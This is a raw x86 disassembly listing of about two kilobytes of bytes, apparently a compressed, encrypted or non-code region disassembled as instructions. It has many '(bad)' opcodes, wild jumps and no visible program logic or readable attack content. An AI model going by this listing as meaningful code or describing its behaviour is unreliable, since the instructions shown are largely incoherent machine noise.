  41ebea:	repnz cbw 
  41ebed:	push   esi
  41ebee:	add    BYTE PTR [eax],dl
  41ebf0:	xchg   edi,eax
  41ebf1:	mov    BYTE PTR [edx+eiz*2+0x64],dh
  41ebf5:	or     al,0x6a
  41ebf7:	pop    esp
  41ebf8:	dec    edx
  41ebf9:	fst    DWORD PTR [ebx]
  41ebfb:	mov    edx,0x24762f1
  41ec00:	xor    edi,edi
  41ec02:	or     al,0xa6
  41ec04:	loop   0x41ebbc
  41ec06:	xor    BYTE PTR [ebx],bl
  41ec08:	sbb    ebp,esi
  41ec0a:	std    
  41ec0b:	cmp    eax,0xf40cdabc
  41ec10:	jle    0x41ec41
  41ec12:	data16 (bad) [esi]
  41ec15:	ret    0xd8ff
  41ec18:	sbb    edx,DWORD PTR ds:[eax]
  41ec1b:	retf   0xea71
  41ec1e:	sbb    al,0xca
  41ec20:	jo     0x41ec0d
  41ec22:	or     eax,0x9f0e7e7
  41ec27:	js     0x41ebbb
  41ec29:	(bad)  
  41ec2a:	gs cmp ecx,esi
  41ec2d:	ret    
  41ec2e:	std    
  41ec2f:	outs   dx,BYTE PTR ds:[esi]
  41ec30:	jne    0x41ebc9
  41ec32:	pop    es
  41ec33:	add    BYTE PTR [esi+0x7f],dh
  41ec36:	push   edi
  41ec37:	jmp    0x41ec20
  41ec39:	xchg   ebx,eax
  41ec3a:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  41ec3c:	arpl   si,ax
  41ec3e:	div    BYTE PTR [edi-0xbc3e]
  41ec44:	inc    esp
  41ec45:	jno    0x41ec02
  41ec47:	pop    edx
  41ec48:	(bad)  
  41ec49:	test   ebx,0xbc078a23
  41ec4f:	and    edi,DWORD PTR [esi+0x7]
  41ec52:	mov    ah,0x23
  41ec54:	push   esi
  41ec55:	scas   eax,DWORD PTR es:[edi]
  41ec56:	les    eax,FWORD PTR [esi+0x391b9e1e]
  41ec5c:	mov    ebp,0x94de818b
  41ec61:	add    esp,DWORD PTR [ebp-0x78]
  41ec64:	es xchg esi,eax
  41ec66:	mulps  xmm7,XMMWORD PTR [edx-0x18e8145e]
  41ec6d:	fldenv [edx-0x11]
  41ec70:	push   ecx
  41ec71:	push   esi
  41ec72:	lods   al,BYTE PTR ds:[esi]
  41ec73:	gs sti 
  41ec75:	mov    eax,0x1eecf764
  41ec7a:	les    ebp,FWORD PTR [edx]
  41ec7c:	ins    DWORD PTR es:[edi],dx
  41ec7d:	push   cs
  41ec7e:	in     al,dx
  41ec7f:	cmp    BYTE PTR [edi+edx*8],0xaa
  41ec83:	out    dx,al
  41ec84:	push   eax
  41ec85:	enter  0xdd20,0xdc
  41ec89:	adc    al,0xad
  41ec8b:	add    ecx,DWORD PTR [edx]
  41ec8d:	fistp  DWORD PTR [ebp-0x5bb398f2]
  41ec93:	add    esp,ebx
  41ec95:	or     BYTE PTR [eax+0x585900f1],0x11
  41ec9c:	jmp    0x43a8c937
  41eca1:	xor    eax,0xdbe70fb
  41eca6:	dec    edi
  41eca7:	sub    al,ah
  41eca9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ecaa:	es addr16 aas 
  41ecad:	ins    DWORD PTR es:[edi],dx
  41ecae:	xchg   edi,eax
  41ecaf:	stc    
  41ecb0:	add    edx,DWORD PTR [ecx-0x67832b0]
  41ecb6:	and    al,0x3c
  41ecb8:	pop    ss
  41ecb9:	in     al,dx
  41ecba:	rcl    DWORD PTR [esp+esi*8-0x18],0x1d
  41ecbf:	xchg   BYTE PTR [ebp-0x3693b6e0],cl
  41ecc5:	adc    eax,0x55c92cd4
  41ecca:	pop    esi
  41eccb:	mov    al,ds:0xf2991091
  41ecd0:	enter  0x4fa4,0x2c
  41ecd4:	or     al,0xe5
  41ecd6:	or     eax,0x31308d4e
  41ecdb:	pusha  
  41ecdc:	fxch   st(1)
  41ecde:	push   ecx
  41ecdf:	sub    al,0x98
  41ece1:	fmul   QWORD PTR ds:0x5e3d8d3e
  41ece7:	add    BYTE PTR [eax-0x23992e55],ah
  41eced:	add    bh,ah
  41ecef:	dec    eax
  41ecf0:	sti    
  41ecf1:	mov    eax,ds:0x50f4e683
  41ecf6:	dec    ebx
  41ecf7:	add    DWORD PTR [eax+0x9c5d7d2],edi
  41ecfd:	add    BYTE PTR [edi-0x3d],al
  41ed00:	add    BYTE PTR [ebx-0x7ab2afef],bl
  41ed06:	rcl    DWORD PTR [edx],0x5
  41ed09:	bound  ebp,QWORD PTR [esi-0x51703daf]
  41ed0f:	cwde   
  41ed10:	or     al,0xe9
  41ed12:	out    dx,al
  41ed13:	adc    ecx,DWORD PTR [eax+0x4fd585b5]
  41ed19:	bound  ebp,QWORD PTR [eax+ebp*1]
  41ed1c:	push   ebx
  41ed1d:	mov    dh,0xec
  41ed1f:	stos   DWORD PTR es:[edi],eax
  41ed20:	xchg   ebx,edi
  41ed22:	mov    eax,0x61e90098
  41ed27:	mov    ecx,0x1dce274
  41ed2c:	add    eax,0xc1d115e9
  41ed31:	xlat   BYTE PTR ds:[ebx]
  41ed32:	gs jo  0x41ed3d
  41ed35:	push   0x4c
  41ed37:	(bad)  
  41ed39:	fstp   QWORD PTR [esi+0x2f620874]
  41ed3f:	pop    ecx
  41ed40:	loop   0x41ed38
  41ed42:	push   ds
  41ed43:	mov    ds:0xde2ea808,eax
  41ed48:	xchg   edi,eax
  41ed4a:	push   ds
  41ed4b:	jo     0x41ed5d
  41ed4d:	add    cl,BYTE PTR [edi+0x51]
  41ed50:	cli    
  41ed51:	jo     0x41ecf8
  41ed53:	mov    dh,0x14
  41ed55:	push   0x47
  41ed57:	aad    0x72
  41ed59:	and    ebp,edx
  41ed5b:	push   ss
  41ed5c:	and    eax,0xfed6efc5
  41ed61:	inc    DWORD PTR [eax]
  41ed63:	adc    ebx,DWORD PTR [edx+0x607c131f]
  41ed69:	mov    ebx,0x60b5fb8a
  41ed6e:	inc    eax
  41ed6f:	mov    esp,edi
  41ed71:	mov    dl,0xf8
  41ed73:	or     bh,ch
  41ed75:	or     al,0x3
  41ed77:	or     eax,0x63740b2e
  41ed7c:	push   edx
  41ed7d:	aas    
  41ed7e:	and    al,0x67
  41ed80:	push   ebx
  41ed81:	aas    
  41ed82:	add    cl,BYTE PTR [edx-0x46]
  41ed85:	add    eax,0x15a1463c
  41ed8a:	mov    dh,bh
  41ed8c:	mov    ecx,0xaa8b2411
  41ed91:	or     BYTE PTR [ebx+ecx*1],bh
  41ed94:	mov    eax,ds:0xcf504700
  41ed99:	cmp    al,0x80
  41ed9b:	(bad)  
  41ed9c:	fiadd  DWORD PTR [ecx-0x13acf839]
  41eda2:	sub    esi,DWORD PTR [edx+0x3f]
  41eda5:	cld    
  41eda6:	je     0x41edcf
  41eda8:	scas   al,BYTE PTR es:[edi]
  41eda9:	std    
  41edaa:	je     0x41edc3
  41edac:	scas   al,BYTE PTR es:[edi]
  41edad:	std    
  41edae:	adc    eax,0x3b7fef
  41edb3:	jo     0x41ed46
  41edb5:	pop    ds
  41edb6:	and    BYTE PTR [eax+0x11],bh
  41edb9:	or     BYTE PTR [ebp+0x5519a0bb],al
  41edbf:	inc    eax
  41edc0:	mov    DWORD PTR [edi],ebx
  41edc2:	sub    BYTE PTR [ebx+0x3f],bh
  41edc5:	dec    esi
  41edc6:	inc    DWORD PTR [eax]
  41edc8:	xchg   edi,eax
  41edc9:	mov    cl,0x30
  41edcb:	mov    eax,DWORD PTR [eax]
  41edcd:	cmc    
  41edce:	leave  
  41edcf:	add    bl,cl
  41edd1:	aad    0x89
  41edd3:	dec    ebx
  41edd4:	scas   eax,DWORD PTR es:[edi]
  41edd5:	dec    esi
  41edd6:	cli    
  41edd7:	jmp    0x9462:0x246754c7
  41edde:	mov    WORD PTR [ebx+0x46],cs
  41ede1:	je     0x41ee3b
  41ede3:	(bad)  
  41ede4:	xchg   ebp,eax
  41ede5:	outs   dx,DWORD PTR ds:[esi]
  41ede6:	(bad)  
  41ede7:	aas    
  41ede8:	push   ss
  41ede9:	jge    0x41ed77
  41edeb:	inc    eax
  41edec:	jb     0x41edf1
  41edee:	std    
  41edef:	hlt    
  41edf0:	arpl   WORD PTR [eax-0x1],si
  41edf3:	call   DWORD PTR [edx-0x5c]
  41edf6:	or     DWORD PTR [ecx+0x7847421],ecx
  41edfc:	gs cld 
  41edfe:	or     BYTE PTR ds:0x58ba30bd,ch
  41ee04:	mov    ebx,0x620b4539
  41ee09:	arpl   WORD PTR [ecx-0x7313178],di
  41ee0f:	push   esp
  41ee10:	jmp    0x8c561143
  41ee15:	aas    
  41ee16:	pusha  
  41ee17:	jae    0x41ed9f
  41ee19:	fimul  DWORD PTR [ebp+0x5ede3ad6]
  41ee1f:	cld    
  41ee20:	sbb    eax,0xb3feb71e
  41ee25:	xchg   DWORD PTR [ecx-0x743426ff],ebx
  41ee2b:	xor    eax,DWORD PTR [eax]
  41ee2d:	pop    ds
  41ee2e:	xchg   ebx,eax
  41ee2f:	fidivr WORD PTR [edi]
  41ee31:	bound  ebx,QWORD PTR ds:0xc0a5feca
  41ee37:	popa   
  41ee38:	push   ebp
  41ee39:	mov    di,0x58be
  41ee3d:	and    BYTE PTR [edi-0x1],dh
  41ee40:	push   eax
  41ee41:	xor    al,0xfb
  41ee43:	shl    DWORD PTR [ebx],cl
  41ee45:	outs   dx,BYTE PTR ds:[esi]
  41ee46:	fist   WORD PTR [ecx]
  41ee48:	mov    esi,0xd68c714c
  41ee4d:	fnstenv [esi-0x4c16ebd8]
  41ee53:	adc    BYTE PTR [ebx+0x4e7d90c],cl
  41ee59:	xchg   edi,eax
  41ee5a:	push   edx
  41ee5b:	stc    
  41ee5c:	sub    al,0xad
  41ee5e:	pop    ecx
  41ee5f:	shr    DWORD PTR [eax+edx*1-0x19],cl
  41ee63:	pop    esp
  41ee64:	leave  
  41ee65:	cwde   
  41ee66:	xchg   edi,eax
  41ee67:	call   0x70da50d6
  41ee6c:	ret    0x5384
  41ee6f:	es hlt 
  41ee71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee72:	(bad)  
  41ee74:	add    esp,DWORD PTR [edx-0x27]
  41ee77:	dec    esi
  41ee78:	(bad)  
  41ee79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee7a:	(bad)  
  41ee7c:	lea    ebx,[edi-0x4b]
  41ee7f:	loop   0x41ee90
  41ee81:	loop   0x41eed3
  41ee83:	test   al,0x2
  41ee85:	jmp    0x274634a0
  41ee8a:	push   edx
  41ee8b:	test   al,0x5
  41ee8d:	fistp  DWORD PTR [ebx]
  41ee8f:	fimul  DWORD PTR [eax+0x0]
  41ee92:	cmp    eax,0x6203e9dc
  41ee97:	and    BYTE PTR [ebp-0x37],dh
  41ee9a:	arpl   WORD PTR [edi],bx
  41ee9c:	mov    edi,0xb6d95945
  41eea1:	mov    dh,0xea
  41eea3:	mov    eax,ds:0xdd41cf5e
  41eea8:	fwait
  41eea9:	mov    WORD PTR [ecx-0x3b73264b],ss
  41eeaf:	retf   
  41eeb0:	pop    ss
  41eeb1:	mov    eax,0x23c5fcea
  41eeb6:	stos   BYTE PTR es:[edi],al
  41eeb7:	add    eax,0xcf71cbfb
  41eebc:	xor    esp,ecx
  41eebe:	jno    0x41ee96
  41eec0:	data16 ins BYTE PTR es:[edi],dx
  41eec2:	popa   
  41eec3:	push   es
  41eec4:	fisttp DWORD PTR [edx+0xacebf71]
  41eeca:	pop    edi
  41eecb:	inc    eax
  41eecc:	aad    0x1d
  41eece:	mov    ebx,0xdfe600d4
  41eed3:	jmp    0x41ef0f
  41eed5:	bound  ebp,QWORD PTR [edx+0x727418bb]
  41eedb:	(bad)  
  41eedd:	or     al,0x7a
  41eedf:	frstor [edi]
  41eee1:	mov    edi,0x1549a961
  41eee6:	test   eax,0x9ed07516
  41eeeb:	push   ss
  41eeec:	jne    0x41eee1
  41eeee:	loopne 0x41ef66
  41eef0:	add    al,0xfc
  41eef2:	mov    edx,0xaf1456
  41eef7:	or     BYTE PTR [eax],dl
  41eef9:	mov    bh,ch
  41eefb:	dec    edi
  41eefc:	add    bh,dh
  41eefe:	jmp    0xd5c2c864
  41ef03:	imul   edi,esi,0x7db54ef6
  41ef09:	jnp    0x41eed2
  41ef0b:	adc    BYTE PTR [eax+0x3f],0xd9
  41ef0f:	loopne 0x41eeef
  41ef11:	add    BYTE PTR [edx+0x5b],al
  41ef14:	test   DWORD PTR [ecx-0x901a82b],0xfb7de1e9
  41ef1e:	popf   
  41ef1f:	pop    ecx
  41ef20:	(bad)  
  41ef21:	not    BYTE PTR [esi]
  41ef23:	cmp    eax,0x3e8ffb7f
  41ef28:	push   eax
  41ef29:	aas    
  41ef2a:	fldenv [esi+edi*2-0x269e16ff]
  41ef31:	out    0xdf,eax
  41ef33:	jmp    0x98ac2a22
  41ef38:	(bad)  
  41ef39:	jl     0x41ef27
  41ef3b:	loopne 0x41eebd
  41ef3d:	jnp    0x41ef9e
  41ef3f:	push   edi
  41ef40:	push   eax
  41ef41:	inc    edi
  41ef42:	stc    
  41ef43:	and    al,0x7f
  41ef45:	(bad)  
  41ef46:	call   0x9dc8ac
  41ef4b:	test   DWORD PTR [edx-0x42],edx
  41ef4e:	pop    ebp
  41ef4f:	sbb    BYTE PTR [ebx],0x10
  41ef52:	add    BYTE PTR [eax-0x6a],al
  41ef55:	pop    ds
  41ef56:	or     al,0x8b
  41ef58:	sbb    ecx,DWORD PTR [eax]
  41ef5a:	add    BYTE PTR [eax],al
  41ef5c:	push   0x9f748847
  41ef61:	xchg   BYTE PTR [ebx+ecx*4+0x77],dl
  41ef65:	mov    cl,0x14
  41ef67:	push   esi
  41ef68:	dec    esp
  41ef69:	push   ds
  41ef6a:	jo     0x41ef90
  41ef6c:	adc    DWORD PTR [ebx-0x2e],0xffffffe8
  41ef70:	xor    bh,cl
  41ef72:	cld    
  41ef73:	inc    DWORD PTR [esi]
  41ef75:	inc    esp
  41ef76:	cli    
  41ef77:	push   ecx
  41ef78:	xchg   esp,eax
  41ef79:	add    DWORD PTR fs:[ebx-0x3ad096d0],ecx
  41ef80:	arpl   WORD PTR ds:0x97c6003b,di
  41ef86:	cli    
  41ef87:	dec    edi
  41ef88:	or     eax,0x404561f
  41ef8d:	cmp    al,0x58
  41ef8f:	ret    0xda37
  41ef92:	lds    eax,FWORD PTR [ecx]
  41ef94:	dec    edx
  41ef95:	fiadd  DWORD PTR [eax]
  41ef97:	add    BYTE PTR [edx-0x7b000255],ah
  41ef9d:	pop    ss
  41ef9e:	cmp    eax,DWORD PTR [edx+edi*1]
  41efa1:	fiadd  DWORD PTR [eax]
  41efa3:	add    BYTE PTR [edx+0x77],ah
  41efa6:	std    
  41efa7:	jmp    DWORD PTR [ecx+eax*2-0x78]
  41efab:	in     al,dx
  41efac:	nop
  41efad:	xchg   ecx,eax
  41efae:	or     eax,DWORD PTR [ebx+0x40f58a57]
  41efb4:	or     ah,dl
  41efb6:	push   eax
  41efb7:	jmp    FWORD PTR [esi-0x32]
  41efba:	outs   dx,DWORD PTR ds:[esi]
  41efbb:	adc    edi,DWORD PTR [ebp+edx*4+0x4800f6f3]
  41efc2:	(bad)  
  41efc4:	(bad)  
  41efc5:	bound  ebp,QWORD PTR [ebp-0x4f4589a0]
  41efcb:	add    al,0x8b
  41efcd:	daa    
  41efce:	cwde   
  41efcf:	imul   ecx,DWORD PTR [esi],0xf554b49d
  41efd5:	xor    BYTE PTR [ecx-0x1],0xc4
  41efd9:	pop    ds
  41efda:	inc    esp
  41efdb:	xlat   BYTE PTR ds:[ebx]
  41efdc:	xlat   BYTE PTR ds:[ebx]
  41efdd:	and    esi,DWORD PTR [eax-0x76]
  41efe0:	inc    edx
  41efe1:	mov    dl,0xbf
  41efe3:	ins    BYTE PTR es:[edi],dx
  41efe4:	xor    al,0x9f
  41efe6:	pop    bp
  41efe8:	(bad)  
  41efe9:	mov    al,ds:0xd952ff9b
  41efee:	arpl   WORD PTR [ecx+0x70f37242],cx
  41eff4:	pcmpeqb mm5,QWORD PTR [edi-0x10edc801]
  41effb:	ror    DWORD PTR [ebx],cl
  41effd:	test   DWORD PTR [edx+0x266a4244],0xab61fec3
  41f007:	ret    
  41f008:	sti    
  41f009:	fcmovne st,st(2)
  41f00b:	mov    edi,0x572ddeff
  41f010:	call   0xf005a388
  41f015:	xor    eax,0x1dffffd1
  41f01a:	ss push ebx
  41f01c:	jbe    0x41f028
  41f01e:	xor    bh,bh
  41f020:	mov    bl,BYTE PTR [edi+0xe7b4e2]
  41f026:	adc    al,0xe7
  41f028:	pop    ebp
  41f029:	cld    
  41f02a:	sub    esi,DWORD PTR [ecx+0x7b70010]
  41f030:	jno    0x41f080
  41f032:	mov    bl,0x64
  41f034:	mov    BYTE PTR [edx+0x52],dh
  41f037:	imul   DWORD PTR [edi]
  41f039:	mov    DWORD PTR [ecx+esi*2-0x2689ece5],ebx
  41f040:	add    esp,DWORD PTR [eax]
  41f042:	inc    ecx
  41f043:	add    eax,0xbd9a2800
  41f048:	stc    
  41f049:	xlat   BYTE PTR ds:[ebx]
  41f04a:	imul   edi,DWORD PTR [ebp-0x429a280f],0xbd61d809
  41f054:	adc    edi,edx
  41f056:	push   ebx
  41f057:	push   eax
  41f058:	daa    
  41f059:	adc    bl,ah
  41f05b:	shr    DWORD PTR [edx+0x2b505b68],1
  41f061:	add    bl,bl
  41f063:	pmaxsw mm1,QWORD PTR [eax-0x4a17ae63]
  41f06a:	xchg   esi,eax
  41f06b:	push   es
  41f06c:	fimul  WORD PTR [esi-0x76e67ee0]
  41f072:	fwait
  41f073:	xchg   esp,eax
  41f074:	and    al,0x5c
  41f076:	jle    0x41f02f
  41f078:	call   0x6e588f80
  41f07d:	ficom  DWORD PTR [ebp-0x359415e6]
  41f083:	jge    0x41f0df
  41f085:	pop    esp
  41f086:	mov    edi,0xf2792
  41f08b:	bound  ebx,QWORD PTR [eax+0x3d]
  41f08e:	pop    ds
  41f08f:	mov    cl,0x23
  41f091:	fwait
  41f092:	jmp    0x8ed70f20
  41f097:	mov    eax,ds:0x35e9d9b5
  41f09c:	or     al,0x5f
  41f09e:	pop    ecx
  41f09f:	fimul  DWORD PTR [ecx-0x1c3e09de]
  41f0a5:	test   eax,0xa9995303
  41f0aa:	and    BYTE PTR [ecx],0xcd
  41f0ad:	pusha  
  41f0ae:	mov    DWORD PTR [ecx-0x47],0xbd41c770
  41f0b5:	jo     0x41f07e
  41f0b7:	inc    ecx
  41f0b8:	adc    eax,0xb81d6401
  41f0bd:	or     al,0x99
  41f0bf:	fsubr  st,st(7)
  41f0c1:	and    al,0xf9
  41f0c3:	dec    esp
  41f0c4:	jo     0x41f11b
  41f0c6:	xor    al,0x10
  41f0c8:	jge    0x41f0df
  41f0ca:	jne    0x41f09f
  41f0cc:	mov    ebx,0x7266400
  41f0d1:	add    al,0xfb
  41f0d3:	and    DWORD PTR [ebx-0x3b],esi
  41f0d6:	jmp    0xd9a8ca3c
  41f0db:	repnz and al,0xfc
  41f0de:	aam    0x8d
  41f0e0:	in     eax,0x40
  41f0e2:	jmp    0xcd6718bb
  41f0e7:	in     al,dx
  41f0e8:	(bad)  
  41f0ea:	rcr    esp,0x97
  41f0ed:	or     al,0x81
  41f0ef:	add    BYTE PTR [esi+0x59],al
  41f0f2:	add    ecx,ebp
  41f0f4:	(bad)  
  41f0f5:	aam    0x85
  41f0f7:	test   eax,0x2587a292
  41f0fc:	inc    edx
  41f0fd:	mov    ebp,0xc1421587
  41f102:	test   DWORD PTR [eax],esi
  41f104:	xchg   edx,eax
  41f105:	retf   0x2380
  41f108:	mov    DWORD PTR [esi],eax
  41f10a:	or     eax,0x4c541fa0
  41f10f:	add    eax,0xd54526a
  41f114:	data16 jo 0x41f0fe
  41f117:	jb     0x41f12b
  41f119:	mov    bh,0x44
  41f11b:	jmp    0x3ae2:0xeb424f8e
  41f122:	je     0x41f11a
  41f124:	aam    0x92
  41f126:	call   0xfbbc370b
  41f12b:	bound  ebp,QWORD PTR [edx]
  41f12d:	mov    bh,0x3c
  41f12f:	(bad)
  41f134:	xchg   edx,eax
  41f135:	xchg   esi,eax
  41f136:	inc    DWORD PTR [ebx+ecx*2-0x374fd58]
  41f13d:	out    dx,al
  41f13e:	inc    esi
  41f13f:	sub    al,0xfa
  41f141:	(bad)  
  41f142:	jmp    0x3b851bd7
  41f147:	push   eax
  41f148:	mov    bl,0xa1
  41f14a:	daa    
  41f14b:	add    ebx,ecx
  41f14d:	dec    ebx
  41f14e:	aas    
  41f14f:	and    al,0x5f
  41f151:	push   ds
  41f152:	jo     0x41f178
  41f154:	add    BYTE PTR [edi-0x6b],dh
  41f157:	cld    
  41f158:	je     0x41f1c1
  41f15a:	cdq    
  41f15b:	add    BYTE PTR [edi-0x39],al
  41f15e:	inc    esi
  41f15f:	jecxz  0x41f1c8
  41f161:	scas   eax,DWORD PTR es:[edi]
  41f162:	aad    0x0
  41f164:	mov    esi,DWORD PTR [ecx+ebx*8-0x3e]
  41f168:	add    BYTE PTR [ebx+ecx*2+0x3ac50444],ch
  41f16f:	add    eax,0x3f4b7b01
  41f174:	and    al,0x9f
  41f176:	xchg   esi,eax
  41f177:	add    BYTE PTR [edi+0x73],0x78
  41f17b:	mov    BYTE PTR [edi+eiz*4-0x26],al
  41f17f:	bound  ecx,QWORD PTR [ecx+0x4489d144]
  41f185:	push   edi
  41f186:	jge    0x41f108
  41f188:	call   0x484e7bd5
  41f18d:	aaa    
  41f18e:	fadd   st,st(2)
  41f190:	inc    edi
  41f191:	sub    eax,0x750ae9d6
  41f196:	xchg   edi,eax
  41f197:	or     eax,0xc57a9002
  41f19c:	inc    edi
  41f19d:	cmp    eax,0xdc01b0d5
  41f1a2:	aas    
  41f1a3:	push   esi
  41f1a4:	xor    DWORD PTR [edi-0x1e],0xffffffc1
  41f1a8:	push   ebp
  41f1a9:	nop
  41f1aa:	repnz sub ah,0x62
  41f1ae:	or     BYTE PTR [eax+0x123f1252],0xd9
  41f1b5:	cli    
  41f1b6:	ficomp DWORD PTR [ecx-0x4]
  41f1b9:	add    ch,bh
  41f1bb:	repz aas 
  41f1bd:	jae    0x41f147
  41f1bf:	test   eax,0x5734d9f3
  41f1c5:	imul   esi,DWORD PTR ds:0x6a1b8cbf,0xd5f3cb9b
  41f1cf:	jl     0x41f23c
  41f1d1:	adc    BYTE PTR [edx],ah
  41f1d3:	jo     0x41f24f
  41f1d5:	mov    edi,0x581cb14e
  41f1da:	arpl   sp,ax
  41f1dc:	sbb    BYTE PTR [esi-0x1f],dl
  41f1df:	xor    eax,0x979a8859
  41f1e4:	adc    al,0x7d
  41f1e6:	arpl   WORD PTR [eax-0x74],si
  41f1e9:	out    dx,eax
  41f1ea:	out    0x61,eax
  41f1ec:	shr    BYTE PTR [ecx],1
  41f1ee:	or     dh,BYTE PTR [eax-0x1]
  41f1f1:	punpckldq mm7,DWORD PTR [edi-0x637aaa4b]
  41f1f8:	mov    ds:0x7a702210,eax
  41f1fd:	mov    edi,0x69b4a0ef
  41f202:	ins    DWORD PTR es:[edi],dx
  41f203:	imul   BYTE PTR [esi]
  41f205:	mov    dh,0x7b
  41f207:	hlt    
  41f208:	add    al,0x0
  41f20a:	dec    edx
  41f20b:	(bad)  
  41f20c:	jmp    0x3d3e480f
  41f211:	mov    BYTE PTR [ebx+ebx*1],bl
  41f214:	fld    TBYTE PTR [eax]
  41f216:	arpl   WORD PTR [edx-0x4d507747],ax
  41f21c:	ins    BYTE PTR es:[edi],dx
  41f21d:	outs   dx,BYTE PTR ds:[esi]
  41f21e:	add    BYTE PTR [ecx-0x6077007f],cl
  41f224:	scas   al,BYTE PTR es:[edi]
  41f225:	ins    BYTE PTR es:[edi],dx
  41f226:	data16 jns 0x41f202
  41f229:	call   0xbededd31
  41f22e:	dec    edx
  41f22f:	and    dl,BYTE PTR [eax]
  41f231:	pop    edi
  41f232:	rol    BYTE PTR [ecx-0x1f],1
  41f235:	mov    dl,0x83
  41f237:	inc    edi
  41f238:	mov    ch,0x6e
  41f23a:	pop    esi
  41f23b:	jo     0x41f217
  41f23d:	mov    ds:0x7cc83783,eax
  41f242:	add    ah,BYTE PTR [eax+edx*1-0x31194e67]
  41f249:	xchg   ecx,eax
  41f24a:	hlt    
  41f24b:	popf   
  41f24c:	fldenv [ebx+eax*2+0x50]
  41f250:	mov    esp,0x5d8fff5f
  41f255:	test   eax,0x9b56dcf
  41f25a:	rcl    BYTE PTR [ecx-0x4b],1
  41f25d:	lock aad 0x61
  41f260:	mov    ch,0xe4
  41f262:	rcr    DWORD PTR [ecx-0x4b],1
  41f265:	stos   BYTE PTR es:[edi],al
  41f266:	iret   
  41f267:	pop    ebp
  41f268:	mov    ch,0xe3
  41f26a:	iret   
  41f26b:	popa   
  41f26c:	mov    ch,0xca
  41f26e:	into   
  41f26f:	popa   
  41f270:	sub    eax,ebp
  41f272:	ins    BYTE PTR es:[edi],dx
  41f273:	arpl   WORD PTR [ebx-0x64d84757],bp
  41f279:	in     eax,dx
  41f27a:	add    esp,ebx
  41f27c:	test   ecx,ebx
  41f27e:	mov    ah,0x10
  41f280:	punpcklwd mm5,DWORD PTR [edi+0x5ec94100]
  41f287:	cmp    bl,dl
  41f289:	and    eax,0xabb6f40e
  41f28e:	aaa    
  41f28f:	adc    al,0x49
  41f291:	lods   al,BYTE PTR ds:[esi]
  41f292:	push   edx
  41f293:	adc    al,0x54
  41f295:	popa   
  41f296:	mov    ch,0x1f
  41f298:	jo     0x41f2f8
  41f29a:	xor    BYTE PTR [eax],cl
  41f29c:	out    0xdb,al
  41f29e:	call   0xa054a6
  41f2a3:	inc    esp
  41f2a4:	sbb    eax,0x2aed80e4
  41f2a9:	mov    dh,0x75
  41f2ab:	out    dx,eax
  41f2ac:	and    al,0x7f
  41f2ae:	out    0xe9,al
  41f2b0:	popa   
  41f2b1:	fld    DWORD PTR [esi+0x3cb40aed]
  41f2b7:	fiadd  WORD PTR [eax+esi*2+0x6261e900]
  41f2be:	lds    esp,FWORD PTR [esp+esi*2+0x3d6c0b38]
  41f2c5:	js     0x41f2c2
  41f2c7:	jmp    0x1243fba8
  41f2cc:	and    eax,0xaa70d3d9
  41f2d1:	mov    ebx,0xbba21118
  41f2d6:	push   cs
  41f2d7:	push   ebp
  41f2d8:	push   0x64eef95a
  41f2dd:	pop    edi
  41f2de:	scas   al,BYTE PTR es:[edi]
  41f2df:	jmp    0xf3c2cc45
  41f2e4:	test   dh,ah
  41f2e6:	test   DWORD PTR [eax+0xd95e00],eax
  41f2ec:	je     0x41f28e
  41f2ee:	jbe    0x41f33b
  41f2f0:	adc    edx,DWORD PTR [ecx+edx*1-0x48399a46]
  41f2f7:	add    BYTE PTR [ecx-0x790489ac],al
  41f2fd:	jmp    0xf6171825
  41f302:	aaa    
  41f303:	or     ebp,DWORD PTR [ebp+0x13]
  41f306:	js     0x41f303
  41f308:	jmp    0xbdca7e60
  41f30d:	jge    0x41f2da
  41f30f:	jmp    0x11b5184
  41f314:	push   0xffffffaf
  41f316:	fdiv   QWORD PTR [edx+0xa]
  41f319:	adc    BYTE PTR [ecx],al
  41f31b:	add    eax,DWORD PTR [eax]
  41f31d:	add    DWORD PTR [esi-0x79],edx
  41f320:	mov    al,ds:0xce8db0b
  41f325:	je     0x41f335
  41f327:	std    
  41f328:	test   BYTE PTR [ebx-0x77],bh
  41f32b:	add    esi,DWORD PTR [edx+0x244f630a]
  41f331:	sbb    DWORD PTR [esi+eiz*2],eax
  41f334:	mov    eax,edi
  41f336:	(bad)  
  41f337:	sbb    BYTE PTR [ebp-0x28fe2238],cl
  41f33d:	mov    ecx,0x1f44841a
  41f342:	ins    BYTE PTR es:[edi],dx
  41f343:	or     al,0xb6
  41f345:	cmp    esp,DWORD PTR [edi+edi*1+0x24]
  41f349:	pop    ss
  41f34a:	popa   
  41f34b:	jnp    0x41f2f5
  41f34d:	add    bl,ch
  41f34f:	call   0xc839:0x1aed0efb
  41f356:	sub    eax,0x5f4c8872
  41f35b:	jno    0x41f3ae
  41f35d:	mov    esi,DWORD PTR [edi+0x7f661b61]
  41f363:	fisttp QWORD PTR [ecx-0x1df5c30]
  41f369:	push   esp
  41f36b:	idiv   BYTE PTR [ebx+0x47626275]
  41f371:	and    al,0x63
  41f373:	arpl   WORD PTR [edi],di
  41f375:	and    al,0x88
  41f377:	or     al,0xbc
  41f379:	mov    BYTE PTR [edi],bh
  41f37b:	mov    ecx,0x8b773c11
  41f380:	adc    eax,0x1dc588d
  41f385:	xlat   BYTE PTR ds:[ebx]
  41f386:	loopne 0x41f3d6
  41f388:	or     al,0xb6
  41f38a:	aas    
  41f38b:	mov    ecx,0xeecb8a11
  41f390:	fwait
  41f391:	inc    eax
  41f392:	dec    ebx
  41f393:	(bad)  
  41f394:	call   FWORD PTR ds:0x53894662
  41f39a:	jle    0x41f40e
  41f39c:	xchg   BYTE PTR [ebx-0x7a],cl
  41f39f:	xchg   esp,eax
  41f3a0:	mov    edx,0x81873b38
  41f3a5:	cli    
  41f3a6:	sub    al,0xaf
  41f3a8:	push   edx
  41f3a9:	sub    BYTE PTR ds:0x7623cb83,ch
  41f3af:	lahf   
  41f3b0:	xchg   ch,al
  41f3b2:	add    BYTE PTR [ebp+esi*1+0x702680b6],dh
  41f3b9:	ds xor bh,0x4c
  41f3bd:	pop    esi
  41f3be:	adc    DWORD PTR [eax],0xfffffff5
  41f3c1:	xor    bh,BYTE PTR [ebx]
  41f3c3:	addr16 in al,dx
  41f3c5:	cmp    ebx,DWORD PTR ss:[eax-0xc]
  41f3c9:	sub    bh,BYTE PTR [ebx]
  41f3cb:	pop    ebx
  41f3cc:	in     al,dx
